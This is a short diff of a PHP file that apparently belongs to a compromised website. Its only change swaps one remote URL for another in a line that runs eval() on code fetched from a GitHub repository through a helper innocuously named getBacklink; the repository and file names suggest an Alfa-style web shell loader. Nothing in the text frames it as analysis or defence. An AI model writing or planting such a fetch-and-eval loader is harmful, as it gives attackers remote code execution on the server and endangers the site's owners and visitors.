@@ -20,6 +20,6 @@ function getBacklink($url) {
 }
 
 
-eval("?>" . getBacklink("https://raw.githubusercontent.com/sekjhhh/shel-baru/refs/heads/main/alfaecrypttttt"));
+eval("?>" . getBacklink("https://raw.githubusercontent.com/sekjhhh/shel-baru/refs/heads/main/alfaecryptty"));
 
 ?>
